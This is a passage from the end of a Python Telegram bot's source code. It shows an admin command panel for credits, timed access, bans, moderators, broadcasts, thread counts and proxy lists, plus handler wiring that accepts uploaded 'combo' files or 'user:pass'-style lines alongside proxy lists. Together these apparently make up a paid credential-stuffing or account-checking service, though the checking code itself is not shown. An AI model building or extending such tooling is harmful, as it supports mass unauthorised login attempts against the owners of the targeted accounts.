    if txt.startswith("!!help"): await u.message.reply_text("!!addcredits [uid] [amt]\n!!setcredits [uid] [amt]\n!!resetcredits [uid]\n!!grant [uid]\n!!revoke [uid]\n!!addaccess [uid] [days]\n!!ban [uid]\n!!unban [uid]\n!!mod [uid]\n!!unmod [uid]\n!!listmods\n!!info [uid]\n!!stats\n!!broadcast [msg]\n!!setthreads [uid] [n]\n!!addproxies [msg]")
    elif txt.startswith("!!addcredits") and len(args) == 2: db_api.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!setcredits") and len(args) == 2: db_api.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!resetcredits") and len(args) == 1: db_api.reset_credits(int(args[0])); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!grant") and len(args) == 1: db_api.grant_access(int(args[0])); await u.message.reply_text("✅ Granted.")
    elif txt.startswith("!!revoke") and len(args) == 1: db_api.revoke_access(int(args[0])); await u.message.reply_text("✅ Revoked.")
    elif txt.startswith("!!addaccess") and len(args) == 2: db_api.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!ban") and len(args) == 1: db_api.ban(int(args[0])); await u.message.reply_text("✅ Banned.")
    elif txt.startswith("!!unban") and len(args) == 1: db_api.unban(int(args[0])); await u.message.reply_text("✅ Unbanned.")
    elif txt.startswith("!!mod") and len(args) == 1 and uid == ADMIN_ID: db_api.set_mod(int(args[0]), 1); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!unmod") and len(args) == 1 and uid == ADMIN_ID: db_api.set_mod(int(args[0]), 0); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!listmods"): ms = db_api.list_mods(); await u.message.reply_text("\n".join([f"{m['uid']} (@{m['username']})" for m in ms]))
    elif txt.startswith("!!info") and len(args) == 1: await u.message.reply_text(json.dumps(db_api.get_user_info(int(args[0])), indent=2))
    elif txt.startswith("!!stats"): await u.message.reply_text(json.dumps(db_api.get_global_stats(), indent=2))
    elif txt.startswith("!!broadcast"):
        msg_text = " ".join(args); count = 0
        for target in db_api.get_all_user_ids():
            try: await c.bot.send_message(target, msg_text); count += 1; await asyncio.sleep(0.05)
            except: pass
        await u.message.reply_text(f"✅ Broadcast sent to {count} users")
    elif txt.startswith("!!setthreads") and len(args) == 2: db_api.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅ Done.")
    elif txt.startswith("!!addproxies"):
        new_px = [l.strip() for l in txt.replace("!!addproxies", "").strip().splitlines() if l.strip()]
        PROXIES_LIST.extend(new_px); await u.message.reply_text(f"✅ Added {len(new_px)} global proxies.")

def main():
    db_api.init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CommandHandler("skw", cmd_skw))
    app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.CaptionRegex(re.compile(r'prox', re.I)), handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") | (filters.TEXT & filters.Regex(r'[^!].+:.+')), handle_combo))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
